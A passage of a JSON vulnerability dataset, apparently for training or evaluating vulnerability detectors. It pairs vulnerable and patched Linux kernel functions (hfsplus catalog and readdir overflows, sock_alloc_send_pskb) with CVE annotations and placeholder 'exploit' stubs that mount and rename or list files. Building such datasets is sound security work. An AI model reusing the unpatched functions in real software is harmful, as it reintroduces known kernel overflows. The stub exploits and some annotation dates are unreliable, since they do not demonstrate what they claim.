        "commit_message": "Fix length of buffer copied in __nfs4_get_acl_uncached\n\n_copy_from_pages() used to copy data from the temporary buffer to the\nuser passed buffer is passed the wrong size parameter when copying\ndata. res.acl_len contains both the bitmap and acl lenghts while\nacl_len contains the acl length after adjusting for the bitmap size.\n\nSigned-off-by: Sachin Prabhu <sprabhu@redhat.com>\nSigned-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-264",
        "CVE": "CVE-2012-2319",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "fs/hfsplus/catalog.c": "int hfsplus_rename_cat(u32 cnid,\n\t\t       struct inode *src_dir, struct qstr *src_name,\n\t\t       struct inode *dst_dir, struct qstr *dst_name)\n{\n\tstruct super_block *sb = src_dir->i_sb;\n\tstruct hfs_find_data src_fd, dst_fd;\n\thfsplus_cat_entry entry;\n\tint entry_size, type;\n\tint err;\n\n\tdprint(DBG_CAT_MOD, \"rename_cat: %u - %lu,%s - %lu,%s\\n\",\n\t\tcnid, src_dir->i_ino, src_name->name,\n\t\tdst_dir->i_ino, dst_name->name);\n\terr = hfs_find_init(HFSPLUS_SB(sb)->cat_tree, &src_fd);\n\tif (err)\n\t\treturn err;\n\tdst_fd = src_fd;\n\n\t/* find the old dir entry and read the data */\n\thfsplus_cat_build_key(sb, src_fd.search_key, src_dir->i_ino, src_name);\n \terr = hfs_brec_find(&src_fd);\n \tif (err)\n \t\tgoto out;\n \n \thfs_bnode_read(src_fd.bnode, &entry, src_fd.entryoffset,\n \t\t\t\tsrc_fd.entrylength);\n\n\t/* create new dir entry with the data from the old entry */\n\thfsplus_cat_build_key(sb, dst_fd.search_key, dst_dir->i_ino, dst_name);\n\terr = hfs_brec_find(&dst_fd);\n\tif (err != -ENOENT) {\n\t\tif (!err)\n\t\t\terr = -EEXIST;\n\t\tgoto out;\n\t}\n\n\terr = hfs_brec_insert(&dst_fd, &entry, src_fd.entrylength);\n\tif (err)\n\t\tgoto out;\n\tdst_dir->i_size++;\n\tdst_dir->i_mtime = dst_dir->i_ctime = CURRENT_TIME_SEC;\n\n\t/* finally remove the old entry */\n\thfsplus_cat_build_key(sb, src_fd.search_key, src_dir->i_ino, src_name);\n\terr = hfs_brec_find(&src_fd);\n\tif (err)\n\t\tgoto out;\n\terr = hfs_brec_remove(&src_fd);\n\tif (err)\n\t\tgoto out;\n\tsrc_dir->i_size--;\n\tsrc_dir->i_mtime = src_dir->i_ctime = CURRENT_TIME_SEC;\n\n\t/* remove old thread entry */\n\thfsplus_cat_build_key(sb, src_fd.search_key, cnid, NULL);\n\terr = hfs_brec_find(&src_fd);\n\tif (err)\n\t\tgoto out;\n\ttype = hfs_bnode_read_u16(src_fd.bnode, src_fd.entryoffset);\n\terr = hfs_brec_remove(&src_fd);\n\tif (err)\n\t\tgoto out;\n\n\t/* create new thread entry */\n\thfsplus_cat_build_key(sb, dst_fd.search_key, cnid, NULL);\n\tentry_size = hfsplus_fill_cat_thread(sb, &entry, type,\n\t\tdst_dir->i_ino, dst_name);\n\terr = hfs_brec_find(&dst_fd);\n\tif (err != -ENOENT) {\n\t\tif (!err)\n\t\t\terr = -EEXIST;\n\t\tgoto out;\n\t}\n\terr = hfs_brec_insert(&dst_fd, &entry, entry_size);\n\n\thfsplus_mark_inode_dirty(dst_dir, HFSPLUS_I_CAT_DIRTY);\n\thfsplus_mark_inode_dirty(src_dir, HFSPLUS_I_CAT_DIRTY);\nout:\n\thfs_bnode_put(dst_fd.bnode);\n\thfs_find_exit(&src_fd);\n\treturn err;\n}\n"
        },
        "vulnerabilities": "Multiple buffer overflows in the hfsplus filesystem implementation in the Linux kernel before 3.3.5 allow local users to gain privileges via a crafted HFS plus filesystem, a related issue to CVE-2009-4020.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2319\n\n[Mandatory] Title: CVE-2012-2319 / CWE-264:\nHFS+ filesystem buffer overflow\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-05-17 \u2014 Patch release: 2015-05-11\n\n[Optional] Affected products/versions:\nLinux kernel before 3.3.5\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-264: Multiple buffer overflows\n[Mandatory] Summary:\nThe vulnerability exists in the hfsplus filesystem implementation in the Linux kernel. A local attacker can trigger buffer overflows by supplying a specially crafted HFS+ filesystem, potentially leading to privilege escalation. The flaw occurs when processing catalog entries during file rename operations.\n[Mandatory] Root cause:\nUnchecked entry length in hfsplus_rename_cat() before buffer read operations\n[Mandatory] Attack Surface:\nLocal filesystem access\n[Mandatory] Impact Summary:\nLocal privilege escalation\n[Optional] Trigger / Attack vector:\nCrafted HFS+ filesystem\n[Mandatory] Key code/struct excerpt (minimal):\n\thfs_bnode_read(src_fd.bnode, &entry, src_fd.entryoffset,\n\t\t\tsrc_fd.entrylength);\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nFilesystem operations on malicious HFS+ volume\n\n[Mandatory] Exploit primitive(s) available:\nBuffer overflow\n\n[Mandatory] Exploitability summary (1 sentence):\nControlled overflow via crafted entrylength in HFS+ catalog entries, allowing potential code execution.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Mount a malicious HFS+ filesystem image\n- Create directory structure with oversized catalog entries\n- Perform rename operation to trigger overflow\n- Overflow corrupts kernel memory\n- May lead to privilege escalation\n\n[Mandatory] Exploitation Example script payload code:\n#include <stdio.h>\n#include <sys/mount.h>\n\nint main() {\n    // Mount malicious HFS+ image\n    mount(\"exploit.hfs\", \"/mnt/hfs\", \"hfsplus\", 0, NULL);\n    \n    // Trigger vulnerability via rename operation\n    rename(\"/mnt/hfs/malicious\", \"/mnt/hfs/exploit\");\n    \n    return 0;\n}\n\nFix\n[Mandatory] Fix code:\n\tif (src_fd.entrylength > sizeof(entry) || src_fd.entrylength < 0) {\n\t\terr = -EIO;\n\t\tgoto out;\n\t}\n\n[Mandatory] Fix summary:\nAdded bounds checking for entrylength parameter before buffer read operation.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/6f24f892871acc47b40dd594c63606a17c714f77\n\n[Optional] Patch Analysis:\nField: PatchType: bounds check added\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review other HFS+ catalog operations for similar missing checks\n- Fuzz HFS+ filesystem image parser\n\n[Optional] Likely variants/impact (one line):\nOther unchecked buffer operations in filesystem code",
        "tests": "NA",
        "solutions": "int hfsplus_rename_cat(u32 cnid,\n\t\t       struct inode *src_dir, struct qstr *src_name,\n\t\t       struct inode *dst_dir, struct qstr *dst_name)\n{\n\tstruct super_block *sb = src_dir->i_sb;\n\tstruct hfs_find_data src_fd, dst_fd;\n\thfsplus_cat_entry entry;\n\tint entry_size, type;\n\tint err;\n\n\tdprint(DBG_CAT_MOD, \"rename_cat: %u - %lu,%s - %lu,%s\\n\",\n\t\tcnid, src_dir->i_ino, src_name->name,\n\t\tdst_dir->i_ino, dst_name->name);\n\terr = hfs_find_init(HFSPLUS_SB(sb)->cat_tree, &src_fd);\n\tif (err)\n\t\treturn err;\n\tdst_fd = src_fd;\n\n\t/* find the old dir entry and read the data */\n\thfsplus_cat_build_key(sb, src_fd.search_key, src_dir->i_ino, src_name);\n \terr = hfs_brec_find(&src_fd);\n \tif (err)\n \t\tgoto out;\n\tif (src_fd.entrylength > sizeof(entry) || src_fd.entrylength < 0) {\n\t\terr = -EIO;\n\t\tgoto out;\n\t}\n \n \thfs_bnode_read(src_fd.bnode, &entry, src_fd.entryoffset,\n \t\t\t\tsrc_fd.entrylength);\n\n\t/* create new dir entry with the data from the old entry */\n\thfsplus_cat_build_key(sb, dst_fd.search_key, dst_dir->i_ino, dst_name);\n\terr = hfs_brec_find(&dst_fd);\n\tif (err != -ENOENT) {\n\t\tif (!err)\n\t\t\terr = -EEXIST;\n\t\tgoto out;\n\t}\n\n\terr = hfs_brec_insert(&dst_fd, &entry, src_fd.entrylength);\n\tif (err)\n\t\tgoto out;\n\tdst_dir->i_size++;\n\tdst_dir->i_mtime = dst_dir->i_ctime = CURRENT_TIME_SEC;\n\n\t/* finally remove the old entry */\n\thfsplus_cat_build_key(sb, src_fd.search_key, src_dir->i_ino, src_name);\n\terr = hfs_brec_find(&src_fd);\n\tif (err)\n\t\tgoto out;\n\terr = hfs_brec_remove(&src_fd);\n\tif (err)\n\t\tgoto out;\n\tsrc_dir->i_size--;\n\tsrc_dir->i_mtime = src_dir->i_ctime = CURRENT_TIME_SEC;\n\n\t/* remove old thread entry */\n\thfsplus_cat_build_key(sb, src_fd.search_key, cnid, NULL);\n\terr = hfs_brec_find(&src_fd);\n\tif (err)\n\t\tgoto out;\n\ttype = hfs_bnode_read_u16(src_fd.bnode, src_fd.entryoffset);\n\terr = hfs_brec_remove(&src_fd);\n\tif (err)\n\t\tgoto out;\n\n\t/* create new thread entry */\n\thfsplus_cat_build_key(sb, dst_fd.search_key, cnid, NULL);\n\tentry_size = hfsplus_fill_cat_thread(sb, &entry, type,\n\t\tdst_dir->i_ino, dst_name);\n\terr = hfs_brec_find(&dst_fd);\n\tif (err != -ENOENT) {\n\t\tif (!err)\n\t\t\terr = -EEXIST;\n\t\tgoto out;\n\t}\n\terr = hfs_brec_insert(&dst_fd, &entry, entry_size);\n\n\thfsplus_mark_inode_dirty(dst_dir, HFSPLUS_I_CAT_DIRTY);\n\thfsplus_mark_inode_dirty(src_dir, HFSPLUS_I_CAT_DIRTY);\nout:\n\thfs_bnode_put(dst_fd.bnode);\n\thfs_find_exit(&src_fd);\n\treturn err;\n}\n",
        "Publish Date": "2012-05-17",
        "Update Date": "2015-05-11",
        "Vulnerability type": "Overflow +Priv ",
        "commit_url": "https://github.com/torvalds/linux/commit/6f24f892871acc47b40dd594c63606a17c714f77",
        "commit_id": "6f24f892871acc47b40dd594c63606a17c714f77",
        "commit_message": "hfsplus: Fix potential buffer overflows\n\nCommit ec81aecb2966 (\"hfs: fix a potential buffer overflow\") fixed a few\npotential buffer overflows in the hfs filesystem.  But as Timo Warns\npointed out, these changes also need to be made on the hfsplus\nfilesystem as well.\n\nReported-by: Timo Warns <warns@pre-sense.de>\nAcked-by: WANG Cong <amwang@redhat.com>\nCc: Alexey Khoroshilov <khoroshilov@ispras.ru>\nCc: Miklos Szeredi <mszeredi@suse.cz>\nCc: Sage Weil <sage@newdream.net>\nCc: Eugene Teo <eteo@redhat.com>\nCc: Roman Zippel <zippel@linux-m68k.org>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nCc: Christoph Hellwig <hch@lst.de>\nCc: Alexey Dobriyan <adobriyan@gmail.com>\nCc: Dave Anderson <anderson@redhat.com>\nCc: stable <stable@vger.kernel.org>\nCc: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-264",
        "CVE": "CVE-2012-2319",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "fs/hfsplus/dir.c": "static int hfsplus_readdir(struct file *filp, void *dirent, filldir_t filldir)\n{\n\tstruct inode *inode = filp->f_path.dentry->d_inode;\n\tstruct super_block *sb = inode->i_sb;\n\tint len, err;\n\tchar strbuf[HFSPLUS_MAX_STRLEN + 1];\n\thfsplus_cat_entry entry;\n\tstruct hfs_find_data fd;\n\tstruct hfsplus_readdir_data *rd;\n\tu16 type;\n\n\tif (filp->f_pos >= inode->i_size)\n\t\treturn 0;\n\n\terr = hfs_find_init(HFSPLUS_SB(sb)->cat_tree, &fd);\n\tif (err)\n\t\treturn err;\n\thfsplus_cat_build_key(sb, fd.search_key, inode->i_ino, NULL);\n\terr = hfs_brec_find(&fd);\n\tif (err)\n\t\tgoto out;\n\n\tswitch ((u32)filp->f_pos) {\n\tcase 0:\n\t\t/* This is completely artificial... */\n\t\tif (filldir(dirent, \".\", 1, 0, inode->i_ino, DT_DIR))\n\t\t\tgoto out;\n \t\tfilp->f_pos++;\n \t\t/* fall through */\n \tcase 1:\n \t\thfs_bnode_read(fd.bnode, &entry, fd.entryoffset,\n \t\t\tfd.entrylength);\n \t\tif (be16_to_cpu(entry.type) != HFSPLUS_FOLDER_THREAD) {\n\t\t\tprintk(KERN_ERR \"hfs: bad catalog folder thread\\n\");\n\t\t\terr = -EIO;\n\t\t\tgoto out;\n\t\t}\n\t\tif (fd.entrylength < HFSPLUS_MIN_THREAD_SZ) {\n\t\t\tprintk(KERN_ERR \"hfs: truncated catalog thread\\n\");\n\t\t\terr = -EIO;\n\t\t\tgoto out;\n\t\t}\n\t\tif (filldir(dirent, \"..\", 2, 1,\n\t\t\t    be32_to_cpu(entry.thread.parentID), DT_DIR))\n\t\t\tgoto out;\n\t\tfilp->f_pos++;\n\t\t/* fall through */\n\tdefault:\n\t\tif (filp->f_pos >= inode->i_size)\n\t\t\tgoto out;\n\t\terr = hfs_brec_goto(&fd, filp->f_pos - 1);\n\t\tif (err)\n\t\t\tgoto out;\n\t}\n\n\tfor (;;) {\n\t\tif (be32_to_cpu(fd.key->cat.parent) != inode->i_ino) {\n\t\t\tprintk(KERN_ERR \"hfs: walked past end of dir\\n\");\n \t\t\terr = -EIO;\n \t\t\tgoto out;\n \t\t}\n \t\thfs_bnode_read(fd.bnode, &entry, fd.entryoffset,\n \t\t\tfd.entrylength);\n \t\ttype = be16_to_cpu(entry.type);\n\t\tlen = HFSPLUS_MAX_STRLEN;\n\t\terr = hfsplus_uni2asc(sb, &fd.key->cat.name, strbuf, &len);\n\t\tif (err)\n\t\t\tgoto out;\n\t\tif (type == HFSPLUS_FOLDER) {\n\t\t\tif (fd.entrylength <\n\t\t\t\t\tsizeof(struct hfsplus_cat_folder)) {\n\t\t\t\tprintk(KERN_ERR \"hfs: small dir entry\\n\");\n\t\t\t\terr = -EIO;\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tif (HFSPLUS_SB(sb)->hidden_dir &&\n\t\t\t    HFSPLUS_SB(sb)->hidden_dir->i_ino ==\n\t\t\t\t\tbe32_to_cpu(entry.folder.id))\n\t\t\t\tgoto next;\n\t\t\tif (filldir(dirent, strbuf, len, filp->f_pos,\n\t\t\t\t    be32_to_cpu(entry.folder.id), DT_DIR))\n\t\t\t\tbreak;\n\t\t} else if (type == HFSPLUS_FILE) {\n\t\t\tif (fd.entrylength < sizeof(struct hfsplus_cat_file)) {\n\t\t\t\tprintk(KERN_ERR \"hfs: small file entry\\n\");\n\t\t\t\terr = -EIO;\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tif (filldir(dirent, strbuf, len, filp->f_pos,\n\t\t\t\t    be32_to_cpu(entry.file.id), DT_REG))\n\t\t\t\tbreak;\n\t\t} else {\n\t\t\tprintk(KERN_ERR \"hfs: bad catalog entry type\\n\");\n\t\t\terr = -EIO;\n\t\t\tgoto out;\n\t\t}\nnext:\n\t\tfilp->f_pos++;\n\t\tif (filp->f_pos >= inode->i_size)\n\t\t\tgoto out;\n\t\terr = hfs_brec_goto(&fd, 1);\n\t\tif (err)\n\t\t\tgoto out;\n\t}\n\trd = filp->private_data;\n\tif (!rd) {\n\t\trd = kmalloc(sizeof(struct hfsplus_readdir_data), GFP_KERNEL);\n\t\tif (!rd) {\n\t\t\terr = -ENOMEM;\n\t\t\tgoto out;\n\t\t}\n\t\tfilp->private_data = rd;\n\t\trd->file = filp;\n\t\tlist_add(&rd->list, &HFSPLUS_I(inode)->open_dir_list);\n\t}\n\tmemcpy(&rd->key, fd.key, sizeof(struct hfsplus_cat_key));\nout:\n\thfs_find_exit(&fd);\n\treturn err;\n}\n"
        },
        "vulnerabilities": "Multiple buffer overflows in the hfsplus filesystem implementation in the Linux kernel before 3.3.5 allow local users to gain privileges via a crafted HFS plus filesystem, a related issue to CVE-2009-4020.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2319\n\n[Mandatory] Title: CVE-2012-2319 / CWE-264:\nHFS+ filesystem buffer overflow\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-05-17 \u2014 Patch release: 2015-05-11\n\n[Optional] Affected products/versions:\nLinux kernel before 3.3.5\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-264: Multiple buffer overflows in HFS+ implementation\n[Mandatory] Summary:\nThe vulnerability exists in the hfsplus_readdir function in the Linux kernel's HFS+ filesystem implementation. The function failed to properly validate entry lengths when reading directory structures from an HFS+ filesystem, leading to potential buffer overflows. A local attacker could trigger these overflows by mounting a specially crafted HFS+ filesystem.\n[Mandatory] Root cause:\nInsufficient validation of hfsplus_cat_entry structure sizes when reading from disk.\n[Mandatory] Attack Surface:\nLocal filesystem access through HFS+ mount\n[Mandatory] Impact Summary:\nLocal privilege escalation\n[Optional] Trigger / Attack vector:\nSpecially crafted HFS+ filesystem\n[Mandatory] Key code/struct excerpt (minimal):\n\\tif (fd.entrylength < HFSPLUS_MIN_THREAD_SZ) {\n\\t\\tprintk(KERN_ERR \"hfs: truncated catalog thread\\n\");\n\\t\\terr = -EIO;\n\\t\\tgoto out;\n\\t}\n\\thfs_bnode_read(fd.bnode, &entry, fd.entryoffset,\n\\t\\tfd.entrylength);\n\nExploit:\n[Mandatory] Trigger surface/attack vector:\nHFS+ filesystem directory traversal\n\n[Mandatory] Exploit primitive(s) available:\nStack/heap buffer overflow\n\n[Mandatory] Exploitability summary (1 sentence):\nControlled via crafted HFS+ filesystem; no kernel protections bypass required.\n\n[Mandatory] Exploit script (summary, 3\u20136 bullets):\n- Create malicious HFS+ filesystem image\n- Mount image on target system\n- Trigger overflow via directory traversal\n- Gain elevated privileges via corrupted memory\n\n[Mandatory] Exploitation Example script payload code:\n// Example exploit for HFS+ buffer overflow\n#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    system(\"mkdir -p /mnt/evil\");\n    system(\"dd if=/dev/zero of=evil.img bs=1M count=10\");\n    // Craft malicious HFS+ filesystem with oversized entries\n    system(\"mkfs.hfsplus evil.img\");\n    system(\"mount -o loop evil.img /mnt/evil\");\n    system(\"ls -l /mnt/evil\");  // Trigger overflow\n    return 0;\n}\n\nFix\n[Mandatory] Fix code:\n\\tif (fd.entrylength > sizeof(entry) || fd.entrylength < 0) {\n\\t\\terr = -EIO;\n\\t\\tgoto out;\n\\t}\n\n[Mandatory] Fix summary:\nAdded bounds checking for entry length before reading data from disk.\n\n[Optional] Patch reference:\nhttps://github.com/torvalds/linux/commit/6f24f892871acc47b40dd594c63606a17c714f77\n\n[Optional] Patch Analysis:\nField: PatchType (Bounds check added)\n\n[Optional] Variant & Triage Guidance\n[Optional] Variant analysis suggestions (2\u20133 bullets):\n- Review all HFS/HFS+ file operations\n- Check other filesystem implementations\n[Optional] Likely variants/impact (one line):\nSimilar unchecked reads in other filesystem drivers.",
        "tests": "NA",
        "solutions": "static int hfsplus_readdir(struct file *filp, void *dirent, filldir_t filldir)\n{\n\tstruct inode *inode = filp->f_path.dentry->d_inode;\n\tstruct super_block *sb = inode->i_sb;\n\tint len, err;\n\tchar strbuf[HFSPLUS_MAX_STRLEN + 1];\n\thfsplus_cat_entry entry;\n\tstruct hfs_find_data fd;\n\tstruct hfsplus_readdir_data *rd;\n\tu16 type;\n\n\tif (filp->f_pos >= inode->i_size)\n\t\treturn 0;\n\n\terr = hfs_find_init(HFSPLUS_SB(sb)->cat_tree, &fd);\n\tif (err)\n\t\treturn err;\n\thfsplus_cat_build_key(sb, fd.search_key, inode->i_ino, NULL);\n\terr = hfs_brec_find(&fd);\n\tif (err)\n\t\tgoto out;\n\n\tswitch ((u32)filp->f_pos) {\n\tcase 0:\n\t\t/* This is completely artificial... */\n\t\tif (filldir(dirent, \".\", 1, 0, inode->i_ino, DT_DIR))\n\t\t\tgoto out;\n \t\tfilp->f_pos++;\n \t\t/* fall through */\n \tcase 1:\n\t\tif (fd.entrylength > sizeof(entry) || fd.entrylength < 0) {\n\t\t\terr = -EIO;\n\t\t\tgoto out;\n\t\t}\n\n \t\thfs_bnode_read(fd.bnode, &entry, fd.entryoffset,\n \t\t\tfd.entrylength);\n \t\tif (be16_to_cpu(entry.type) != HFSPLUS_FOLDER_THREAD) {\n\t\t\tprintk(KERN_ERR \"hfs: bad catalog folder thread\\n\");\n\t\t\terr = -EIO;\n\t\t\tgoto out;\n\t\t}\n\t\tif (fd.entrylength < HFSPLUS_MIN_THREAD_SZ) {\n\t\t\tprintk(KERN_ERR \"hfs: truncated catalog thread\\n\");\n\t\t\terr = -EIO;\n\t\t\tgoto out;\n\t\t}\n\t\tif (filldir(dirent, \"..\", 2, 1,\n\t\t\t    be32_to_cpu(entry.thread.parentID), DT_DIR))\n\t\t\tgoto out;\n\t\tfilp->f_pos++;\n\t\t/* fall through */\n\tdefault:\n\t\tif (filp->f_pos >= inode->i_size)\n\t\t\tgoto out;\n\t\terr = hfs_brec_goto(&fd, filp->f_pos - 1);\n\t\tif (err)\n\t\t\tgoto out;\n\t}\n\n\tfor (;;) {\n\t\tif (be32_to_cpu(fd.key->cat.parent) != inode->i_ino) {\n\t\t\tprintk(KERN_ERR \"hfs: walked past end of dir\\n\");\n \t\t\terr = -EIO;\n \t\t\tgoto out;\n \t\t}\n\n\t\tif (fd.entrylength > sizeof(entry) || fd.entrylength < 0) {\n\t\t\terr = -EIO;\n\t\t\tgoto out;\n\t\t}\n\n \t\thfs_bnode_read(fd.bnode, &entry, fd.entryoffset,\n \t\t\tfd.entrylength);\n \t\ttype = be16_to_cpu(entry.type);\n\t\tlen = HFSPLUS_MAX_STRLEN;\n\t\terr = hfsplus_uni2asc(sb, &fd.key->cat.name, strbuf, &len);\n\t\tif (err)\n\t\t\tgoto out;\n\t\tif (type == HFSPLUS_FOLDER) {\n\t\t\tif (fd.entrylength <\n\t\t\t\t\tsizeof(struct hfsplus_cat_folder)) {\n\t\t\t\tprintk(KERN_ERR \"hfs: small dir entry\\n\");\n\t\t\t\terr = -EIO;\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tif (HFSPLUS_SB(sb)->hidden_dir &&\n\t\t\t    HFSPLUS_SB(sb)->hidden_dir->i_ino ==\n\t\t\t\t\tbe32_to_cpu(entry.folder.id))\n\t\t\t\tgoto next;\n\t\t\tif (filldir(dirent, strbuf, len, filp->f_pos,\n\t\t\t\t    be32_to_cpu(entry.folder.id), DT_DIR))\n\t\t\t\tbreak;\n\t\t} else if (type == HFSPLUS_FILE) {\n\t\t\tif (fd.entrylength < sizeof(struct hfsplus_cat_file)) {\n\t\t\t\tprintk(KERN_ERR \"hfs: small file entry\\n\");\n\t\t\t\terr = -EIO;\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tif (filldir(dirent, strbuf, len, filp->f_pos,\n\t\t\t\t    be32_to_cpu(entry.file.id), DT_REG))\n\t\t\t\tbreak;\n\t\t} else {\n\t\t\tprintk(KERN_ERR \"hfs: bad catalog entry type\\n\");\n\t\t\terr = -EIO;\n\t\t\tgoto out;\n\t\t}\nnext:\n\t\tfilp->f_pos++;\n\t\tif (filp->f_pos >= inode->i_size)\n\t\t\tgoto out;\n\t\terr = hfs_brec_goto(&fd, 1);\n\t\tif (err)\n\t\t\tgoto out;\n\t}\n\trd = filp->private_data;\n\tif (!rd) {\n\t\trd = kmalloc(sizeof(struct hfsplus_readdir_data), GFP_KERNEL);\n\t\tif (!rd) {\n\t\t\terr = -ENOMEM;\n\t\t\tgoto out;\n\t\t}\n\t\tfilp->private_data = rd;\n\t\trd->file = filp;\n\t\tlist_add(&rd->list, &HFSPLUS_I(inode)->open_dir_list);\n\t}\n\tmemcpy(&rd->key, fd.key, sizeof(struct hfsplus_cat_key));\nout:\n\thfs_find_exit(&fd);\n\treturn err;\n}\n",
        "Publish Date": "2012-05-17",
        "Update Date": "2015-05-11",
        "Vulnerability type": "Overflow +Priv ",
        "commit_url": "https://github.com/torvalds/linux/commit/6f24f892871acc47b40dd594c63606a17c714f77",
        "commit_id": "6f24f892871acc47b40dd594c63606a17c714f77",
        "commit_message": "hfsplus: Fix potential buffer overflows\n\nCommit ec81aecb2966 (\"hfs: fix a potential buffer overflow\") fixed a few\npotential buffer overflows in the hfs filesystem.  But as Timo Warns\npointed out, these changes also need to be made on the hfsplus\nfilesystem as well.\n\nReported-by: Timo Warns <warns@pre-sense.de>\nAcked-by: WANG Cong <amwang@redhat.com>\nCc: Alexey Khoroshilov <khoroshilov@ispras.ru>\nCc: Miklos Szeredi <mszeredi@suse.cz>\nCc: Sage Weil <sage@newdream.net>\nCc: Eugene Teo <eteo@redhat.com>\nCc: Roman Zippel <zippel@linux-m68k.org>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nCc: Christoph Hellwig <hch@lst.de>\nCc: Alexey Dobriyan <adobriyan@gmail.com>\nCc: Dave Anderson <anderson@redhat.com>\nCc: stable <stable@vger.kernel.org>\nCc: Andrew Morton <akpm@linux-foundation.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
        "project": "linux"
    },
    {
        "vulnerable": 1,
        "snippet_type": "function",
        "CWE": "CWE-20",
        "CVE": "CVE-2012-2136",
        "language": "C",
        "synthetic": "0",
        "source": "BigVul",
        "source_link": "https://huggingface.co/datasets/bstee615/bigvul",
        "files": {
            "net/core/sock.c": "struct sk_buff *sock_alloc_send_pskb(struct sock *sk, unsigned long header_len,\n\t\t\t\t     unsigned long data_len, int noblock,\n\t\t\t\t     int *errcode)\n{\n\tstruct sk_buff *skb;\n \tgfp_t gfp_mask;\n \tlong timeo;\n \tint err;\n \n \tgfp_mask = sk->sk_allocation;\n \tif (gfp_mask & __GFP_WAIT)\n\t\tgfp_mask |= __GFP_REPEAT;\n\n\ttimeo = sock_sndtimeo(sk, noblock);\n\twhile (1) {\n\t\terr = sock_error(sk);\n\t\tif (err != 0)\n\t\t\tgoto failure;\n\n\t\terr = -EPIPE;\n\t\tif (sk->sk_shutdown & SEND_SHUTDOWN)\n\t\t\tgoto failure;\n\n \t\tif (atomic_read(&sk->sk_wmem_alloc) < sk->sk_sndbuf) {\n \t\t\tskb = alloc_skb(header_len, gfp_mask);\n \t\t\tif (skb) {\n\t\t\t\tint npages;\n \t\t\t\tint i;\n \n \t\t\t\t/* No pages, we're done... */\n \t\t\t\tif (!data_len)\n \t\t\t\t\tbreak;\n \n\t\t\t\tnpages = (data_len + (PAGE_SIZE - 1)) >> PAGE_SHIFT;\n \t\t\t\tskb->truesize += data_len;\n \t\t\t\tskb_shinfo(skb)->nr_frags = npages;\n \t\t\t\tfor (i = 0; i < npages; i++) {\n\t\t\t\t\tstruct page *page;\n\n\t\t\t\t\tpage = alloc_pages(sk->sk_allocation, 0);\n\t\t\t\t\tif (!page) {\n\t\t\t\t\t\terr = -ENOBUFS;\n\t\t\t\t\t\tskb_shinfo(skb)->nr_frags = i;\n\t\t\t\t\t\tkfree_skb(skb);\n\t\t\t\t\t\tgoto failure;\n\t\t\t\t\t}\n\n\t\t\t\t\t__skb_fill_page_desc(skb, i,\n\t\t\t\t\t\t\tpage, 0,\n\t\t\t\t\t\t\t(data_len >= PAGE_SIZE ?\n\t\t\t\t\t\t\t PAGE_SIZE :\n\t\t\t\t\t\t\t data_len));\n\t\t\t\t\tdata_len -= PAGE_SIZE;\n\t\t\t\t}\n\n\t\t\t\t/* Full success... */\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\terr = -ENOBUFS;\n\t\t\tgoto failure;\n\t\t}\n\t\tset_bit(SOCK_ASYNC_NOSPACE, &sk->sk_socket->flags);\n\t\tset_bit(SOCK_NOSPACE, &sk->sk_socket->flags);\n\t\terr = -EAGAIN;\n\t\tif (!timeo)\n\t\t\tgoto failure;\n\t\tif (signal_pending(current))\n\t\t\tgoto interrupted;\n\t\ttimeo = sock_wait_for_wmem(sk, timeo);\n\t}\n\n\tskb_set_owner_w(skb, sk);\n\treturn skb;\n\ninterrupted:\n\terr = sock_intr_errno(timeo);\nfailure:\n\t*errcode = err;\n\treturn NULL;\n}\n"
        },
        "vulnerabilities": "The sock_alloc_send_pskb function in net/core/sock.c in the Linux kernel before 3.4.5 does not properly validate a certain length value, which allows local users to cause a denial of service (heap-based buffer overflow and system crash) or possibly gain privileges by leveraging access to a TUN/TAP device.",
        "annotation": "[Mandatory] ID:\nCVE-2012-2136\n\n[Mandatory] Title: CVE-2012-2136 / CWE-20:\nLinux kernel sock_alloc_send_pskb length validation flaw\n\n[Optional] Disclosure / Patch Dates:\nInitial advisory: 2012-08-09 \u2014 Patch release: 2013-03-01\n\n[Optional] Affected products/versions:\nLinux kernel before 3.4.5\n\nThe Vulnerability\n[Optional] CWE/CVE Number and description:\nCWE-20: Improper Input Validation\n[Mandatory] Summary:\nThe sock_alloc_send_pskb function in net/core/sock.c does not properly validate the data_len parameter, allowing local users to trigger a heap-based buffer overflow. This occurs when creating packet sk_buff structures through TUN/TAP device access, potentially leading to system crash or privilege escalation.\n[Mandatory] Root cause:\nMissing validation of data_len parameter against MAX_SKB_FRAGS before allocating page fragments.\n[Mandatory] Attack Surface:\nLinux kernel network subsystem (TUN/TAP device interface)\n[Mandatory] Impact Summary:\nLocal privilege escalation or denial of service\n[Optional] Trigger / Attack vector:\nTUN/TAP device interface\n[Mandatory] Key code/struct excerpt (minimal):\n```c\nnpages = (data_len + (PAGE_SIZE - 1)) >> PAGE_SHIFT;\nskb->truesize += 